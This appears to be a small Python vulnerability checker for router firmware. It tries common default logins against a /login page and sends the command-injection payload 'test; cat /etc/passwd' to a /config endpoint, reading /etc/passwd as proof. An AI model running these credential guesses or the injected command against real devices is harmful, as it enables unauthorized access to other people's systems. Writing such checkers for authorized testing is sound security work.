import os
import requests

FIRMWARE_IP = "127.0.0.1"

"""
Explain vulnerability
"""

"""Chekcs for the common hardcoded credentials"""
def check_for_cred():
    print("Checking for common hardcoded credentials...")

    #TP-Link uses admin as user and admin as passwd
    common_creds = [("admin", "admin"), ("root", "root"), ("admin", "12345")]

    for user, password in common_creds:
        try:
            res = requests.post(f"http://{FIRMWARE_IP}/login", data={"username": user, "password": password})
            
            #Somtimes routers display Welcome, Admin. Reason behind welcome
            if "welcome" in res.text.lower():
                print(f"Weak credential found!: {user}:{password}")
            
            #Checks for status code 200
            elif res.status_code == 200 and "dashboard" in res.text.lower():
                print(f"Weak credential found!: {user}:{password}")

        except Exception as e:
            print(f"Connection error: {e}")

"""Checks for the command injection vulnerability"""
def check_command_injection():
    print("Checking for command injection...")

    payload = "test; cat /etc/passwd"

    res = requests.post(f"http://{FIRMWARE_IP}/config", data={"input": payload})
    if "root:x" in res.text:
        print(f"Command injection vulnerability found!")



if __name__ == "__main__":
    check_for_cred()
    check_command_injection()